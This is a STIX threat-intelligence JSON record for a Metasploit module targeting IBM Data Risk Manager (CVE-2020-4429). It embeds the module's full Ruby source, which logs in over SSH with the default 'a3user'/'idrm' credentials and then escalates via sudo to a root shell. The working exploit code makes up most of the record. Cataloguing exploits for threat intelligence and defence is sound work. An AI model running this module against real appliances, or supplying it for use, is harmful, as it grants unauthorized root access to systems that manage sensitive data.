{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66aff30e-5ad0-4ac6-99b4-1c227c21daa1",
    "created": "2024-08-14T16:58:05.492497Z",
    "modified": "2024-08-14T16:58:05.492502Z",
    "name": "IBM Data Risk Manager a3user Default Password",
    "description": " This module abuses a known default password in IBM Data Risk Manager. The 'a3user' has the default password 'idrm' and allows an attacker to log in to the virtual appliance via SSH. This can be escalate to full root access, as 'a3user' has sudo access with the default password. At the time of disclosure this was an 0day, but it was later confirmed and patched by IBM. Versions <= 2.0.6.1 are confirmed to be vulnerable.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/ibm_drm_a3user.rb",
            "external_id": "ibm_drm_a3user.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2020/Apr/33"
        },
        {
            "source_name": "reference",
            "url": "https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'IBM Data Risk Manager a3user Default Password',\n        'Description' => %q{\n          This module abuses a known default password in IBM Data Risk Manager. The 'a3user'\n          has the default password 'idrm' and allows an attacker to log in to the virtual appliance\n          via SSH. This can be escalate to full root access, as 'a3user' has sudo access with the default password.\n          At the time of disclosure this was an 0day, but it was later confirmed and patched by IBM.\n          Versions <= 2.0.6.1 are confirmed to be vulnerable.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2020-4429' ], # insecure default password\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ],\n          [ 'URL', 'https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/']\n        ],\n        'Payload' => {\n          'Compat' => {\n            'PayloadType' => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          [ 'IBM Data Risk Manager <= 2.0.6.1', {} ]\n        ],\n        'Privileged' => true,\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-04-21',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(22),\n        OptString.new('USERNAME', [true, 'Username to login with', 'a3user']),\n        OptString.new('PASSWORD', [true, 'Password to login with', 'idrm'])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  def on_new_session(client)\n    print_status(\"#{peer} - Escalating privileges to root, please wait a few seconds...\")\n    # easiest way I found to get passwordless root, not sure if there's a shorter command\n    client.shell_command_token(\"echo #{datastore['PASSWORD']} | sudo -S 'echo 2>/dev/null'; sudo /bin/sh\")\n    print_good(\"#{peer} - Done, enjoy your root shell!\")\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def peer\n    \"#{rhost}:#{rport}\"\n  end\n\n  def do_login(user, pass)\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: rport,\n      password: pass\n    })\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh =\n        ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n          Net::SSH.start(rhost, user, opts)\n        end\n    rescue Rex::ConnectionError\n      fail_with(Failure::Unknown, \"#{peer} SSH - Connection error\")\n    rescue Net::SSH::Disconnect, ::EOFError\n      fail_with(Failure::Unknown, \"#{peer} SSH - Disconnected during negotiation\")\n    rescue ::Timeout::Error\n      fail_with(Failure::Unknown, \"#{peer} SSH - Timed out during negotiation\")\n    rescue Net::SSH::AuthenticationFailed\n      fail_with(Failure::Unknown, \"#{peer} SSH - Failed authentication\")\n    rescue Net::SSH::Exception => e\n      fail_with(Failure::Unknown, \"#{peer} SSH Error: #{e.class} : #{e.message}\")\n    end\n\n    return Net::SSH::CommandStream.new(ssh) if ssh\n\n    nil\n  end\n\n  def exploit\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n\n    print_status(\"#{peer} - Attempting to log in to the IBM Data Risk Manager appliance...\")\n    conn = do_login(user, pass)\n    if conn\n      print_good(\"#{peer} - Login successful (#{user}:#{pass})\")\n      handler(conn.lsock)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-04-21",
    "x_mitre_platforms": [
        "unix'"
    ]
}